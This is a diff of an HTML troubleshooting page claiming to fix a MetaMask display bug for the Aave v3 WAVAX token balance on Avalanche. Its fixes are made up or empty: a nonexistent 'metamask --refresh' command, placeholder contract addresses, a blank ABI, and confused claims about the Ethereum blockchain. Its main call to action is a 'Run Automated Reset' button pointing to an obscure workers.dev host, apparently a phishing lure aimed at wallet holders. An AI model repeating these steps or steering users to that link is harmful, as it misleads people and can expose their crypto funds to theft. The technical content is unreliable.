@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,31 +42,32 @@
 <h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Avalanche network may notice that their Aave v3 WAVAX token balance is displayed incorrectly, potentially causing confusion and affecting their ability to manage their assets effectively.</li>
+<li>Users of the Metamask extension on the Avalanche network may encounter an incorrect balance display for the Aave v3 WAVAX token, leading to confusion and potential errors in transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's handling of token balances on the Aave v3 protocol, specifically affecting the WAVAX token on the Avalanche network. This discrepancy can arise from incorrect cache handling, outdated protocol implementations, or issues with the extension's ability to fetch the latest balance data.</li>
+<li>The error occurs due to a mismatch in the token's contract address or ABI (Application Binary Interface) within the Metamask extension, resulting in an incorrect balance fetch from the Ethereum blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and restart the browser.</li>
-<li>Manually fetch the latest token balance by using the Aave v3 protocol's API:
-  <code>bash
-curl -X GET \
-  https://api.aave.com/api/v2/markets/avalanche \
-  -H 'Content-Type: application/json'</code></li>
-<li>Update the Metamask extension to the latest version to ensure the bug has been patched.
-For more precise control, consider utilizing an external console to execute the above commands.</li>
+<li>Update the token's contract address to the correct one: <code>0x...</code></li>
+<li>Refresh the Metamask extension to re-fetch the token balance: <code>metamask --refresh</code></li>
+<li>Use the following JSON script to manually update the token's ABI:</li>
 </ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;abi&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external interface for a more streamlined token management experience.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured on the Avalanche network.</li>
-<li>Aave v3 protocol supported and enabled within the Metamask extension.</li>
-<li>WAVAX token added to the Metamask extension's wallet.</li>
+<li>Metamask extension installed and configured</li>
+<li>Aave v3 WAVAX token added to the wallet</li>
+<li>Avalanche network selected in the Metamask extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
